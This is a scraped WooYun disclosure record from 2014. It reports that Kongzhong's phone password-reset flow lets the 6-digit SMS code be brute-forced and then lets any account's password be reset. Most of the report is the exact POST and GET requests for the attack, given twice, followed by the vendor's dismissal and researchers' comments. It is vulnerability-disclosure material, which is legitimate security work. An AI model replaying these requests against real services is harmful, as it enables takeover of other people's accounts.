{"id": 58957, "wybug_id": "wooyun-2014-049004", "wybug_title": "空中网设计不当任意手机账户重置密码（爆破）", "wybug_corp": "空中网", "wybug_author": "蜉蝣", "wybug_date": "2014-01-16 10:21", "wybug_open_date": "2014-01-21 10:21", "wybug_type": "账户体系控制不严", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "认证设计不合理", "认证缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt 详细说明：  通过安全手机找回密码时， 验证6位数手机验证码，可爆破\nPOST /pwdback/pwdchange HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/msword, application/vnd.ms-powerpoint, application/vnd.ms-excel, */*Referer: http://passport.kongzhong.com/pwdback/pwdmobileback/pwdback_mobileAccept-Language: zh-CNContent-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.2)Host: passport.kongzhong.comContent-Length: 72Proxy-Connection: Keep-AlivePragma: no-cacheCookie:******Connection: closephone=手机号&vcode=6位数验证码&pwdbackType=phone&useraccount=账号\n正确验证码返回数据包长度不同 同时返回pagekey利用以下get包重置密码\nGET /ajax/user/changepwd?useraccount=手机号&pwd=新密码&repwd=新密码&pagekey=BDNabARsU2UAMAFsW2oFbVMwUjUGMVsaACUHOAJvBmwAY1cNBngAbAVoDzoDYltxVG0DPwRqWz1SKVZiVzoBaAQwWm8EZVNgAC8BaltsBXhTM1I0BiZbawBsB2oCNQYyADxXZwZj&pwdbacktype=phone&sid= HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: http://passport.kongzhong.com/pwdback/pwdchangeAccept: application/json, text/javascript, */*; q=0.01Accept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.2)Host: passport.kongzhong.comProxy-Connection: Keep-AliveCookie:******\n\n\n   漏洞证明：  通过安全手机找回密码时， 验证6位数手机验证码，可爆破\nPOST /pwdback/pwdchange HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/msword, application/vnd.ms-powerpoint, application/vnd.ms-excel, */*Referer: http://passport.kongzhong.com/pwdback/pwdmobileback/pwdback_mobileAccept-Language: zh-CNContent-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.2)Host: passport.kongzhong.comContent-Length: 72Proxy-Connection: Keep-AlivePragma: no-cacheCookie:******Connection: closephone=手机号&vcode=6位数验证码&pwdbackType=phone&useraccount=账号\n正确验证码返回数据包长度不同 同时返回pagekey利用以下get包重置密码\nGET /ajax/user/changepwd?useraccount=手机号&pwd=新密码&repwd=新密码&pagekey=BDNabARsU2UAMAFsW2oFbVMwUjUGMVsaACUHOAJvBmwAY1cNBngAbAVoDzoDYltxVG0DPwRqWz1SKVZiVzoBaAQwWm8EZVNgAC8BaltsBXhTM1I0BiZbawBsB2oCNQYyADxXZwZj&pwdbacktype=phone&sid= HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: http://passport.kongzhong.com/pwdback/pwdchangeAccept: application/json, text/javascript, */*; q=0.01Accept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.2)Host: passport.kongzhong.comProxy-Connection: Keep-AliveCookie:******\n\n\n   修复方案：  建议多查查其他地方是否有缺陷   版权声明：转载请注明来源 蜉蝣@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-01-21 10:21 厂商回复：  最新状态： 2014-01-21：谢谢您的关注，我们会尽快修复。  ", "replys": "漏洞评价：\n评论\n     2014-01-21 15:51 |    \t\t蜉蝣 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:24        )\t\t \n  被忽略了,又索要地址    \n     2014-04-02 03:46 |    \t\t伟哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:29        | 不怕流氓有文化,就怕色狼有耐心,那么一只起...)\t\t \n  这样的厂商见多了 ←_← 鄙视一下    \n     2014-05-21 13:10 |    \t\t乌龟 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 网络安全爱好者)\t\t \n  逗比代理..    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}